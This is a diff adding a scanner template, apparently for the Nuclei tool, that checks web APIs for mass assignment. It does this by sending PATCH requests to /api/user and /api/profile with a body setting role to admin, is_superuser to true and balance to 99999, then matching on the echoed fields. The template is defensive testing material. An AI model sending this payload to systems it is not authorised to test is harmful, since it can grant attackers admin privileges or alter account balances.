@@ -1,0 +1,34 @@
+id: whai-mass-assignment-json-patch
+
+info:
+  name: Mass Assignment via PATCH
+  author: whitehat-ai
+  severity: high
+  description: Tests mass assignment via PATCH with privileged fields
+  tags: api,mass-assignment,high
+  classification:
+    cwe-id: CWE-915
+
+http:
+  - method: PATCH
+    path:
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/profile"
+
+    headers:
+      Content-Type: application/json
+
+    body: '{"role":"admin","is_superuser":true,"balance":99999}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"admin"'
+          - '"is_superuser":true'
+          - '"balance":99999'
+        condition: or
